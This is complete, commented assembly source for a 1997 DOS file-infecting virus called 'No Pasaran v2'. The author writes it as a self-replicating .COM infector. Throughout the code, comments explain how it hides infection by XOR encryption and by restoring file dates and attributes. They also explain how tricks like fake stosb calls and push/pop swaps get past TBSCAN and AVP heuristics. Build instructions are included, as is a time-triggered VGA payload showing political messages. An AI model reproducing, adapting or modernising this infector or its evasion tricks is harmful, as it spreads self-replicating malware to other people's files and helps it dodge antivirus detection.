; NO PASARAN virus version 2 by Spanska
; Called Spanska.1000 by AV people
; This is my first virus
;
;***********************************************************************
;
;   This virus is dedicated to all spanish and international young
;   guys who fighted against fascist army during Spanish Civil War
;          (1936-1939). They said "THEY SHALL NOT PASS!"
;
;********************************contact me at el_gato@rocketmail.com***
;
; No flag with TBSCAN
; At the time it was released (january 97), was not detected by
; TBSCAN, FPROT, AVP, DrSolly FINDVIRUS in heuristic mode
; but by DrWeb in heuristic mode (i didn't know this program...)
;
; generation zero size: 3537 bytes 
; virus size:           1000 bytes
;
; Compile it with TASM /m2 and TLINK /t
;
;       Properties:
; simple .com runtime infector
; not destructive
; encrypted with variable key
; infects 7 files each run
; infects current directory, than upper directories
; when it reaches the root, it starts infecting all "level1" subdirectories
; doe not infect files >60,000 or <100 bytes, nor command.com
; the VGA graphic bomb (a fire effect) explodes when minutes=22 
; and seconds<30 (1/120)

code    segment
	assume  ds:code, ss:code, cs:code, es:code
	org 100h
;
;---------------fake host code--------------------
;
hote:                                                   
call virus              ;jump to viral code (avoid J flag)          
signature db "lc"       ;virus signature   
nop                     ;
nop                     ;fake host 
nop                     ;
nop                     ;
mov ah, 4ch             ;finished
mov al,0                ;go to
int 21h                 ;DOS

;**********************************************************************
;                      START OF VIRAL CODE
;**********************************************************************

virus:                ;virus starts here
jmp evite             ;avoid next routine

;===    simulation of a stosb    ===
;===  when outside decrypt loop  ===
;===        do not flag #        ===
baise_flag_cryptage:            ;===      
mov [di], al                    ;=========>>>   NO MORE FLAG "#" !!!!!  
inc di                          ;===       
ret                             ;===    
;===================================
;
;---------------get delta offset----------------------------
;
evite:
call $+3                              ;modified classic
delta:                                ;routine to
mov bp, sp                            ;avoid flag E
mov ax, [bp]                          ;
add word ptr [bp], decrypte-delta     ;thanks Slacker's Theory
sub ax, offset delta                  ;of Code through Obscurity!
mov bp, ax
ret
;
;----------------------decrypting routine-------------------------
;
decrypte:
mov dl, [bp+offset clef]               ;get actual key
mov cx, fin_cryptage - debut_cryptage  ;
lea si, [bp+offset debut_cryptage]     ;
mov di, si                             ;
xor_loop:                              ;decrypt loop
mov al, [si]                           ;
inc si                                 ;
xor al, dl                             ;
call baise_flag_cryptage               ;call the fake stosb to avoid flag #
loop xor_loop                          
;
;-----initialization to 0 of both infection and directory counters--------
;
debut_cryptage:                         ;crypted zone starts here    
mov byte ptr [bp+offset compteur], 0    ;infection counter
mov byte ptr [bp+offset phase], 0       ;directory counter
;
;-----------------------remember current repertory-----------------------
;
lea si, [bp+offset repert]     ;
xor dl, dl                     ;
mov ah, 47h                    ;
int 21h                        ;
;
;-----------------DTA go to a predefined zone in memory------------------
;
push 1a00h              ;push/pop to
pop ax                  ;avoid flag F 
lea dx, [bp+offset dta] ;
int 21h                 ;
;
;------------------------find first file--------------------------------- 
;
recherche:
mov cx, 0007h                  ;
lea dx, [bp+offset file_type]  ;
mov ax, 4e00h                  ; 
int 21h                        ;file found?
jnc sauter_suivant             ;yes => c=0, let's continue 
jmp rep_sup                    ;no => go to upper directory
;
;---------------------------find next file-------------------------------- 
;
fichier_suivant:
lea dx, [bp+offset file_type]  ;
mov ax, 4f00h                  ; 
mov cx, 0007h                  ;
int 21h                        ;file found?     
jnc saut5                      ;yes => c=0, let's continue 
jmp rep_sup                    ;no => go to upper direcory
saut5:                         
;
;---------------verify if extension is really .com---------------------
;            (it's made to avoid flag S with tbscan)
; (and to avoid AVP detection 'cause AVP detects all combinations 
;                   like .c?m, .?om..., BUT .c*)
;
sauter_suivant:                
mov cx, 13d                    ;max size of a file name (not really, but
lea si, [bp+offset dta+1eh]    ;who cares? I've stolen this routine somewhere)
compare:                       ;loop for detecting start of the extension
lodsb                          ;letter in al
cmp al, "."                    ;is it a point?
jne compare                    ;no => test next letter
inc si                         ;yes => si points on second extension letter
cmp word ptr [si], "MO"        ;second and third letters are "OM"?
jne fichier_suivant            ;no => find next file
;
;-------------------verify if it's command.com----------------------------
;
cmp word ptr [bp+offset dta+1eh+2], "MM"
je fichier_suivant                         ;yes => find next file
;
;------------attributes to 0 to infect special files---------------------
;
lea dx, [bp+offset dta+1eh]    ;file name pointed with dx
push 4301h                     ;push/pull to
pop ax                         ;avoid flag F 
xor cx, cx                     ;
int 21h                        ;
;
;---------------------------open file------------------------------------
;
mov ax, 3D02h                  ;
lea dx, [bp+offset dta+1eh]    ;
int 21h                        ;file found?
jnc saut2                      ;yes => c=0, let's continue 
jmp remise_en_etat             ;no => arrange file and close it
saut2:                         ;
mov [bp+offset handle],ax      ;
;         
;-----------------read 5 first bytes of the file---------------------
;
xchg ax, bx                          ;  
mov cx, 5                            ;
mov ax, 3F00h                        ;
lea dx, [bp+offset contenu]          ;bytes go to "contenu" zone
int 21h                              ;file found?
jnc saut3                            ;yes => c=0, let's continue 
jmp remise_en_etat                   ;no => arrange file and close it
saut3:                               ;
;
;------------------is the file already infected?-----------------------
;
cmp word ptr [bp+offset contenu+3], "cl"   ;compare with signature
jnz saut4                      ;not infected => z=0, let's continue 
jmp remise_en_etat             ;already infected => arrange file and close
saut4:                         ;
;
;-----------------------is the size correct?---------------------------
;
cmp word ptr [bp+offset dta+1ah], 60000 ;compare size with 60000
jna pas_trop_gros                       ;is it bigger?
jmp remise_en_etat                      ;yes => find next file
pas_trop_gros:                          ;no => other verification
cmp word ptr [bp+offset dta+1ah], 100   ;compare size with 100
jnb verif_ok                            ;if >100 let's continue
;
;--------arrange file and close it in case of non-infection-------------
;
remise_en_etat:
mov ah, 3Eh             ;
int 21h                 ;close it
;
;------------------restore attributes-----------------------------------
;
lea dx, [bp+offset dta+1eh]          ;
xor ch, ch                           ;
mov cl, byte ptr [bp+offset dta+15h] ;attributes are still in the DTA
push 4301h                           ;push/pop to 
pop ax                               ;avoid flag F
int 21h                              ;
;
;----------after arranging the file, let's find another one-------------
;
jmp fichier_suivant            ;go to find-next routine
;
;-------------------disk file pointer at the end-------------------
;
verif_ok:
mov ax, 4202h                         ;
xor cx, cx                            ;
mov dx, cx                            ;
int 21h                               ; 
;
;----------------------infection routine------------------------------
;
;first, let's write non-encrypted part
;
mov ax, 4000h                        ;
mov cx, debut_cryptage - virus       ;
lea dx, [bp+offset virus]            ;
int 21h                              ;
;
;second, let's crypt next part in memory
;
mov cl, [bp+offset cinq_octets+1]      ;cl=new key   
mov byte ptr [bp+offset clef_temp], cl ;on a temporary zone
lea si, [bp+offset debut_cryptage]     ;si=start of the crypted zone
lea di, [bp+offset zone_de_travail]    ;di=temporary mem zone for crypting
xchg cl, dl                            ;key in dl
mov cx, fin_cryptage - debut_cryptage  ;cx=number of bytes to crypt
crypte_et_transfere:                   ;
lodsb                                  ;
xor al, dl                             ;classic XOR crypting loop
stosb                                  ;
loop crypte_et_transfere               ;
;
;third, disk writing of the crypted zone
;
mov ax, 4000h                          ;
mov cx, fin_cryptage - debut_cryptage  ;number of bytes to write 
lea dx, [bp+offset zone_de_travail]    ;
int 21h                                ;
;
;------write on disk real 5 first bytes of the file+new crypt key-------- 
;----from "contenu" zone in memory to "cinq_octets" zone on the disk)----
;
;1) move disk file pointer to good zone
;
xor cx, cx                               ;
mov dx, word ptr [bp+offset dta+1ah]     ;non-infected file size in dx
add dx, cinq_octets - virus              ;add offset of good zone
mov ax, 4200h                            ;
int 21h                                  ;
;
;2) move memory pointer to good zone, and transfer
;
mov cx, 6                               ;we will write 6 bytes
lea dx, [bp+offset contenu]             ;("contenu" + "clef_temp")
push 4000h                              ;so 5 first bytes + new key
pop ax                                  ;this push/pop is not necessary
int 21h                                 ;
;
;--overwrite 5 first bytes on the disk by jump to virus code + signature---
;
;1) move disk file pointer to start of the file
;
xor cx,cx                      ;
mov dx, cx                     ;
mov ax, 4200h                  ;
int 21h                        ;
;
;2) calculate initial jump and write all on a temp zone in memory
;(NB: we use the "contenu" memory zone which is not more util)
;
mov byte ptr [bp+offset contenu], 0e8h    ;E8=opcode of CALL
mov ax, word ptr [bp+offset dta+1ah]      ;ax=file size
sub ax, 3                                 ;this is because of the CALL
mov word ptr [bp+offset contenu+1], ax    ;write deplacement 
mov word ptr [bp+offset contenu+3], "cl"  ;write signature
;
;3) overwrite 5 first bytes on the file
;
mov cx,5                        ;
lea dx, [bp+offset contenu]     ;
mov ax, 4000h                   ;
int 21h                         ;
;
;-------------------restore time/date of the file------------------------
;
mov dx, word ptr [bp+offset dta+18h]   ;date in dx
mov cx, word ptr [bp+offset dta+16h]   ;time in cx
push 5701h                             ;push/pop
pop ax                                 ;to avoid flag F 
int 21h                                ;
;
;-----------------------------close file---------------------------------
;
mov ah, 3Eh             ;
int 21h                 ;
;
;------------------------restore file attributes-----------------------
;
lea dx, [bp+offset dta+1eh]          ;
xor ch, ch                           ;
mov cl, byte ptr [bp+offset dta+15h] ;attributes are still in DTA
push 4301h                           ;
pop ax                               ;
int 21h                              ;
;
;--------------verify how many files we have infected------------------
;
mov byte ptr cl, [bp+offset compteur]   ;infection counter in cl
inc cl                                  ;one more
cmp cl, 7                               ;have we infected 7 files?
je attendre                             ;yes => let's stop
mov byte ptr [bp+offset compteur], cl   ;no => write new value of counter
;
;-----------------------let's infect a new file-------------------------
;
jmp fichier_suivant                     ;infect next file
;
;---------------------climb to upper directory--------------------------
;
rep_sup:                        
lea dx, [bp+offset dot]         ;let's go to ".." repertory
mov ah, 3bh                     ;
int 21h                         ;are we in the root?
jc on_redescend                 ;yes => c=1, let's go down now
jmp recherche                   ;no => find first file
;
;---if we are in root, let's go to all "first-level" subdirectories----- 
;
on_redescend:                       ;
mov ah, 4eh                         ;find first file
mov cx, 16                          ;with repertory attribute
lea dx, [bp+offset dir_masque]      ;called "*.*"...
int 21h                             ;
jc attendre                         ;there are no subdirectory => stop

cmp byte ptr[bp+offset phase], 0    ;how is the dir counter (called phase)?
je le_premier                       ;phase=0 => do not find next dir
 
xor bh, bh                          ;
mov bl, byte ptr [bp+offset phase]  ;bx=phase

rep_suivant:                     ;loop to avoid all subdir already infected
mov cx, 16                       ;rep attributes
mov ah, 4fh                      ;find next dir
lea dx, [bp+offset dir_masque]   ; 
int 21h                          ;
jc attendre                      ;there are no subdirectory => stop 

cmp byte ptr [bp+offset dta+15h], 16    ;is it really a directory?
jne rep_suivant                         ;no => find next

dec bx                           ;this routine is made to infect
cmp bx, 0                        ;directory "number phase"
jne rep_suivant                  ;if bx<>0, the subdir is already infected
    
le_premier:
add byte ptr[bp+offset phase], 1    ;OK, we are on a subdir not infected

lea dx, [bp+offset dta+1eh]         ;so, let's change
mov ah, 3bh                         ;directory to it
int 21h                             ;

jmp recherche                       ;and infect this new subdirectory
;
;-----in case of problem, or no more directory to infect, we go here------
;
attendre:               ;
;
;------------------DTA in the normal zone-----------------------------
;            (to avoid perturbing host program)
;
push 1a00h              ;push/pop 
pop ax                  ;to avoid flag F 
mov dx, 80h             ;to 80h, the normal zone
int 21h                 ;
;
;------restore the directory in which we were when we started-------------
;
;primo, rapid climb until the root
;
remontee_finale:
lea dx, [bp+offset dot]         ;
mov ah, 3bh                     ;
int 21h                         ; 
jnc remontee_finale             ;continue until we are in the root
;
;secundo, we go to the directory in which we were at start
;
lea dx, [bp+offset repert]      ;we saved the dir in this zone
mov ax, 3B00h                   ;change dir
int 21h                         ;
;
;------replace 5 first bytes of the host in memory----------
;
lea si, [bp+offset cinq_octets]   ;original 5 bytes were stored here
mov ax, 101h                      ;classic trick to
dec ax                            ;avoid flag B 
mov di, ax                        ;100h in DI for transfer
mov cx, 5                         ;write 5 bytes
rep movsb                         ;transfer them
;  
;--------------------does the bomb explode?---------------------
;
mov ah, 2Ch               ;internal clock: ch=hour et cl=minute
int 21h                   ;
cmp cl, 22d               ;minutes = 22?
jne redonner_la_main      ;no => return to host
cmp dh, 30d               ;yes =>  test seconds
jb bombe                  ;if seconds <30 (1/120) the bomb explodes 
;
;-----------------------return to host----------------------------
;    (remember the very first CALL: we have 103h on the stack) 
;
redonner_la_main:
pop ax                    ;get 103h
sub ax, 3                 ;we want 100h
push ax                   ;re-put it on stack (for the RET)
xor ax, ax                ;a starting program
xor bx, bx                ;likes to find all
xor cx, cx                ;registers equals
xor dx, dx                ;to zero.
ret                       ;on redonne la main au pauvre programme

nop
nop          ;just for fun: with these 3 nops, virus size is just 1000.
nop
;
;**********************************************************************
;          CODE OF THE GRAPHIC BOMB: A FIRE EFFECT
;**********************************************************************
bombe:

;--------------------------------VGA-----------------------------------

	mov ax, 13h     ;
	int 10h         ;goto graphic mode


;------initialisation of the flame palette (black=>red=>white)----------

	mov dx, 3c8h    ;dx = palette port
	xor al, al      ;starting with color 0
	out dx, al      ;write first color in the port
	inc dx          ;define all colors
	
	xor cx, cx      ;component red start from 0 and augment
rouges:                 ;let's define colors from 0 to 62
	mov al, cl      ;first component (red) equal to cl
	out dx, al      ;write on palette port
	xor al, al      ;others components (blue, green) to zero
	out dx, al      ;write blue component
	out dx, al      ;write green component
	inc cx          ;increment red component of color
	cmp cx, 63      ;do cx reach 63?   
jne rouges              ;no => continue loop

	xor cx, cx      ;component blue start from 0 and augment
jaunes:                 ;let's define colors from 63 to 125
	mov al, 63      ;component red equal to 63
	out dx, al      ;write it
	mov al, cl      ;second component (blue) equal to cl
	out dx, al      ;write it
	xor al, al      ;third component (green) equal to zero
	out dx, al      ;write it
	inc cx          ;increment blue component of color
	cmp cx, 63      ;do cx reach 63?    
jne jaunes              ;no => continue loop

	xor cx, cx      ;component green start from 0 and augment
blancs:                 ;let's define colors from 126 to 188
	mov al, 63      ;components red and blue equal to 63
	out dx, al      ;write red component
	out dx, al      ;write blue component
	mov al, cl      ;third component (green) equal to cl
	out dx, al      ;write it
	inc cx          ;increment green component of color
	cmp cx, 63      ;do cx reach 63?
jne blancs              ;no => continue loop

	mov cx, 198     ;we're going to define 198/3=66 next colors       
blancfin:               ;let's define colors from 189 to 254
	mov al, 255     ;all components are maximum
	out dx, al      ;so these colors are white
loop blancfin           ;

	xor al, al      ;define last color (number 255) 
	mov cx, 3       ;in black so we do not see the
	rep out dx, al  ;focus at the bottom of the flame

;------------draw some focus at the bottom at random places--------------

	mov ax, 0a000h  ;video mem 
	mov es, ax      ;segment in es 
boucle:
	mov di, (320*199)+5   ;start line 199, 5 pixels from the left side 

foyers: 
	call random     ;bring back a random dl between 0 and 255 
	cmp dl, 180     ;dl>180?
	jb noir         ;no => no focus, color to black
	mov dl, 255     ;yes => a focus, color to white
	jmp blanc       ;avoid "no focus" routine

noir:
	xor dl, dl      ;no focus, color to black
blanc:
	mov al, dl      ;load al with color
	mov cx,  5      ;focuses are 5 pixels long 
	
zobi:
	stosb           ;draw focus pixel 
	add di, 319     ;and draw another pixel
	stosb           ;under the first
	sub di, 320     ;(more beautiful)
loop zobi

	cmp di, (320*199)+30   ;the torch will be 30 pixels wide
jb foyers                      ;focus line not finished, so loop 

;--------real screen--->modification--->virtual screen------------------

mov di, 320*120                         ;we use just the 80 bottom lines
lea si, [bp+offset ecran_virtuel]       ;memory zone for calculations
mov dx, 80                              ;line loop: 80 repetitions 
xor ax, ax                              ;we gonna use ax, so put zero

ecran:                                  ;start of line loop
	mov cx, 30                      ;column loop: 30 repetitions
		      
modif:                                  ;start of column loop
	
	mov al, es:[di]         ;in al, color of current pixel
	add al, es:[di+320]     ;add pixel color just under it
	adc ah, 0               ;result may be >255, so add carry
	add al, es:[di+319]     ;add pixel color under it to the left
	adc ah, 0               ;add carry
	add al, es:[di+641]     ;add pixel 2 lines under it to the right
	adc ah, 0               ;add carry
	shr ax, 1               ;calculate the average color of these
	shr ax, 1               ;4 pixels, dividing ax by 4
	cmp al, 0               ;is this average value black?
	je bitnoir              ;yes => do not decrement color
	dec al                  ;no => decrement color

bitnoir:
	mov ds:[si], al         ;write pixel with new color on memory
	inc si                  ;next pixel on memory (virtual screen)
	inc di                  ;next pixel on screen (real screen)
			
loop modif         ;finish the line

add di, (320-30)   ;on screen, go to first pixel of next line
dec dx             ;dx = line counter, decrement it
cmp dx, 0          ;are we to the bottom of the screen?
jne ecran          ;no => let's go to next line

;----------------virtual screen--->real screen-------------------------

mov di, (320*120)                   ;di points to line 120 on real screen
lea si, [bp+offset ecran_virtuel]   ;si points to start of virtual screen

xor dx, dx                 ;line counter to zero

deux_flammes:
	mov cx, 30         ;copy one line to the 
	rep movsb          ;left side of the screen   
	sub si, 30         ;virtual: rewind to the start of the same line
	add di, 230        ;real: draw the second torch at column 230+30+5
	mov cx, 30         ;copy the same line to the 
	rep movsb          ;right side of the screen
	add di, 30         ;real: start next line (NB: 295+30=320+5)
	inc dx             ;increment line counter
	cmp dx, 79         ;copy 78 lines
jne deux_flammes

;--------------put text cursor at line 5, column 1----------------------

mov dx, 0501h      ;dh=line, dl=column        
xor bh, bh         ;page zero
mov ah,02h         ;put cursor to position DH, DL
int 10h            ;BIOS screen int
						    
;--------------------write text message on screen-----------------------

mov ah, [bp+offset clignote]     ;blink counter in ah
inc ah                           ;increment it
mov [bp+offset clignote], ah     ;put it back to its place
cmp ah, 128                      ;compare it to 128 (alternance time 50/50)
ja second_message                ;inferior => write second message
lea si, [bp+offset message]      ;superior => write first message
jmp premier_message              ;and avoid second message
second_message:                  ;
lea si, [bp+offset message2]     ;now write second message
premier_message:

mov cx, 36                       ;message lenght
 
affiche_message:
	lodsb           ;load letter in al
	mov bl, 254     ;and color in bl (white)
	mov ah, 0Eh     ;
	int 10h         ;write this letter on screen
loop affiche_message

	jmp boucle      ;return to step "draw focus"

;-----------random number creation routine (stolen somewhere)--------------

random proc near
	mov ax, [bp+offset aleat]       
	mov dx, 8405h                   
	mul dx                          
	inc ax
	mov [bp+offset aleat], ax
	ret
random endp

;--------------memory zones of the graphic effect------------------------

message  db " Remember those who died for Madrid "     ;message 1
message2 db "No Pasaran! Virus v2 by Spanska 1997"     ;message 2
clignote db 00                                         ;blink counter
aleat    dw 0AAh                                       ;random seed

;
;-------------------memory zones of the virus----------------------------
;
dir_masque  db "*.*",0           ;mask to find subdirectories
file_type   db "*.c*",0          ;mask to find file type 
dot         db "..",0            ;mask to find upper directory
fin_cryptage:                    ;end of crypting  
cinq_octets db 5 dup(90h)        ;5 first bytes of host  
clef        db 0                 ;crypt key
;
;--------these temporary memory zones are not written on disk------------
;
phase      db 0                 ;to find the good subdirectories
compteur   db 0                 ;infection counter
handle     db 0,0               ;file handle 
contenu    db 0,0,0,0,0         ;to read 5 first bytes of a file
clef_temp  db 0                 ;crypt key
dta        db 48 dup (0AAh)     ;DTA zone
repert     db 64 dup (0FFh)     ;starting directory
ecran_virtuel db 80*30 dup (00) ;virtual screen
zone_de_travail:                ;used to crypt virus

code    ends
	end     hote

; ------------------------(c) Spanska 1997------------------------------         
